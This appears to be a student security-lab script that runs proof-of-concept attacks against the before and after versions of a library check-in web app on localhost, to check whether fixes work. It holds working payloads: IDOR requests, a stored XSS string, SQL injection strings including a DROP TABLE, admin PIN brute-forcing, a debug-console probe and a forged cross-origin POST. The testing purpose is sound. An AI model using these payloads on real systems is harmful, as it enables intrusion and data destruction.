"""Lab 6 proof-of-concept attacks, run against the BEFORE snapshot (Lab 5 code, http://localhost:5001) and the AFTER code
(https://localhost:8443). Only our own test servers are attacked."""
import json, os, re, sqlite3, sys, requests
HERE = os.path.dirname(os.path.abspath(__file__)); ROOT = os.path.join(HERE, "..")
BEFORE, AFTER = "http://localhost:5001", "https://localhost:8443"
CA = os.path.join(ROOT, "app", "certs", "ca.pem")
env = dict(l.strip().split("=", 1) for l in open(os.path.join(ROOT, "app", ".env")) if "=" in l)
def S(verify=None):
    s = requests.Session(); s.trust_env = False
    if verify: s.verify = verify
    return s
def line(t=""): print(t, flush=True)
def show(r, n=210):
    b = r.text.strip().replace("\n", " ")
    return f"HTTP {r.status_code}  {b[:n]}"
LIB = {"latitude": -14.2962, "longitude": 28.5605}
def checkin(base, s, sid, name, floor, seat, **kw):
    return s.post(base + "/api/checkin", json={"student_id": sid, "full_name": name, "course": "BSc CS", "floor": floor, "seat_number": seat, **LIB}, **kw)

targets = [("BEFORE", BEFORE, None, "MU2026"), ("AFTER", AFTER, CA, env["MU_ADMIN_PIN"])]
line("=== P1. A01 Broken Access Control / IDOR: attacker (no session, no cookie) acts on a victim's check-in ===")
for tag, base, ca, pin in targets:
    victim, attacker = S(ca), S(ca)
    r = checkin(base, victim, "202300111", "Victim Student", "ground", "G7"); line(f"[{tag}] victim checks in            -> {show(r, 80)}")
    r = attacker.get(base + "/api/session_status/202300111"); line(f"[{tag}] attacker reads status         -> {show(r)}")
    r = attacker.post(base + "/api/away", json={"student_id": "202300111"}); line(f"[{tag}] attacker marks victim away    -> {show(r)}")
    r = attacker.post(base + "/api/checkout", json={"student_id": "202300111"}); line(f"[{tag}] attacker checks victim out    -> {show(r)}")
    r = victim.get(base + "/api/session_status/202300111"); line(f"[{tag}] victim's own status afterwards -> {show(r)}")
    line()
line("=== P2. A01/A02 Data exposure: GET /api/active_sessions with no login ===")
for tag, base, ca, pin in targets:
    s = S(ca); checkin(base, s, "202300222", "Mary Banda", "first", "F3")
    r = S(ca).get(base + "/api/active_sessions"); line(f"[{tag}] {show(r, 260)}")
line()
line("=== P3. A03 Stored XSS payload in the name field ===")
payload = '<img src=x onerror="window.__pwned=1">'
for tag, base, ca, pin in targets:
    r = checkin(base, S(ca), "202300333", payload, "second", "S9"); line(f"[{tag}] check-in with payload -> {show(r)}")
line()
line("=== P4. A03 SQL injection payloads (own test servers) ===")
for tag, base, ca, pin in targets:
    s = S(ca)
    for p in ["' OR '1'='1", "1; DROP TABLE active_sessions;--", "x' UNION SELECT name FROM sqlite_master--"]:
        r = s.get(base + "/api/session_status/" + requests.utils.quote(p, safe="")); line(f"[{tag}] GET session_status/{p!r:48} -> {show(r, 70)}")
        r = s.post(base + "/api/checkin", json={"student_id": p, "full_name": "Test User", "course": "x", "floor": "ground", "seat_number": "G1", **LIB}); line(f"[{tag}] POST checkin student_id={p!r:40} -> {show(r, 70)}")
    db = os.path.join(ROOT, "before" if tag == "BEFORE" else "app", "library.db")
    n = sqlite3.connect(db).execute("select count(*) from sqlite_master where name='active_sessions'").fetchone()[0]
    line(f"[{tag}] table active_sessions still exists after the payloads: {bool(n)}")
line()
line("=== P5. A05/A07 Hard-coded default admin PIN taken from the source code ===")
for tag, base, ca, pin in targets:
    r = S(ca).post(base + "/api/admin/login", json={"pin": "MU2026"}); line(f"[{tag}] login with the old source-code default 'MU2026' -> {show(r, 90)}")
line()
line("=== P6. A07 Brute-forcing the admin PIN (14 wrong guesses) ===")
for tag, base, ca, pin in targets:
    s = S(ca); codes = [s.post(base + "/api/admin/login", json={"pin": f"guess{i:04d}"}).status_code for i in range(14)]
    line(f"[{tag}] status codes: {' '.join(map(str, codes))}")
line()
line("=== P7. A05 Werkzeug debugger console exposed (debug=True in the old code) ===")
r = S().get(BEFORE + "/console"); line(f"[BEFORE] GET /console -> HTTP {r.status_code}  {'Interactive Console' in r.text and 'interactive console page served' or ''}")
r = S(CA).get(AFTER + "/console"); line(f"[AFTER ] GET /console -> HTTP {r.status_code}")
line()
line("=== P8. A01/A04 Cross-site request: forged POST with a foreign Origin header ===")
for tag, base, ca, pin in targets:
    s = S(ca); checkin(base, s, "202300444", "Carol Mwale", "ground", "G9")
    r = s.post(base + "/api/checkout", json={"student_id": "202300444"}, headers={"Origin": "https://evil.example"}); line(f"[{tag}] POST /api/checkout, Origin: https://evil.example -> {show(r, 100)}")
